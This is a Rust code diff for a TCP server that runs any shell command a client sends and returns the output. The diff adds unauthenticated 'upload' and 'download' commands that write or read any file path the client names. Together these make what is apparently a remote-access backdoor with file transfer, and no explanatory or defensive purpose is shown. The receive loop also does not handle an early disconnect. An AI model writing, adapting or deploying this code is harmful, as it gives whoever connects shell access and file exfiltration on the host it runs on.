@@ -1,4 +1,6 @@
 use std::env;
+use std::fs::File;
+use std::path::Path;
 use std::{
     io::{self, Read, Write},
     net::{TcpListener, TcpStream},
@@ -28,22 +30,29 @@ fn process_stream(mut stream: TcpStream) -> io::Result<()> {
     let mut buffer = [0; 1204];
 
     loop {
-        match stream.read(&mut buffer) {
-            Ok(0) => {
-                // Connection closed by client
-                println!("Client disconnected.");
-                break;
-            }
-            Ok(n) => {
-                let message = String::from_utf8_lossy(&buffer[..n]);
-                let response = execute_command(&message)?;
+        let n = stream.read(&mut buffer)?;
+        if n == 0 {
+            println!("Client disconnected.");
+            break;
+        }
 
-                stream.write_all(response.as_bytes())?;
-                stream.flush()?;
-            }
-            Err(e) => {
-                println!("Failed to read from stream: {}", e);
-            }
+        let message = String::from_utf8_lossy(&buffer[..n]);
+
+        if message.starts_with("upload") {
+            let filename = message
+                .split_whitespace()
+                .nth(1)
+                .expect("No file name provided");
+            receive_file(&mut stream, filename)?;
+        } else if message.starts_with("download") {
+            let filename = message
+                .split_whitespace()
+                .nth(1)
+                .expect("No file name provided");
+            send_file(&mut stream, filename)?;
+        } else {
+            let response = execute_command(&message)?;
+            stream.write_all(response.as_bytes())?;
         }
     }
     Ok(())
@@ -91,10 +100,7 @@ fn execute_command(message: &str) -> io::Result<String> {
 
             // Return stdout if the command was successful, otherwise return stderr
             if stdout.is_empty() && stderr.is_empty() {
-                Ok(format!(
-                    "Command '{}' executed successfully.\n",
-                    command
-                ))
+                Ok(format!("Command '{}' executed successfully.\n", command))
             } else if !stdout.is_empty() {
                 Ok(stdout.to_string())
             } else {
@@ -105,4 +111,50 @@ fn execute_command(message: &str) -> io::Result<String> {
         // If the command is empty
         Ok("No command received.".to_string())
     }
+}
+
+fn receive_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
+    let path = Path::new(filename);
+    let mut file = File::create(path)?;
+
+    // Read file size
+    let mut size_buffer = [0; 8];
+    stream.read_exact(&mut size_buffer)?;
+    let file_size = u64::from_be_bytes(size_buffer);
+
+    // Receive file content
+    let mut buffer = [0; 1024];
+    let mut total_bytes_received = 0;
+
+    while total_bytes_received < file_size {
+        let n = stream.read(&mut buffer)?;
+        total_bytes_received += n as u64;
+        file.write_all(&buffer[..n])?;
+    }
+
+    println!("File received: {}", filename);
+    Ok(())
+}
+
+fn send_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
+    let path = Path::new(filename);
+    let mut file = File::open(path)?;
+
+    // Send file size
+    let file_size = file.metadata()?.len();
+    stream.write_all(&file_size.to_be_bytes())?;
+    stream.flush()?;
+
+    // Send file content
+    let mut buffer = [0; 1024];
+    loop {
+        let n = file.read(&mut buffer)?;
+        if n == 0 {
+            break;
+        }
+        stream.write_all(&buffer[..n])?;
+    }
+
+    println!("File sent: {}", filename);
+    Ok(())
 }
